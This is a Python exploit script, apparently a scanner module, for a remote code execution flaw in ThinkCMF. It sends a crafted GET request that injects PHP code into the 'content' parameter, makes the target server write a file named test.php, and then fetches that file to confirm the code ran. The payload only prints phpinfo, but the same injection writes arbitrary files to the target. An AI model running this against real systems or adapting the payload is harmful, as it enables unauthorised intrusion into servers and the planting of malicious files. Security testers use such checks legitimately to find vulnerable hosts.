import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ThinkCMF RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://www.freebuf.com/vuls/217586.html"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["thinkcmf", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/index.php?a=fetch&content={{url_encode(\'<?php file_put_contents(\\"test.php\\",\\"<?php echo phpinfo();\\");\')}}"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/test.php"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp1.status_code == 200 and "PHP Version" in resp1.text and "PHP Version" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url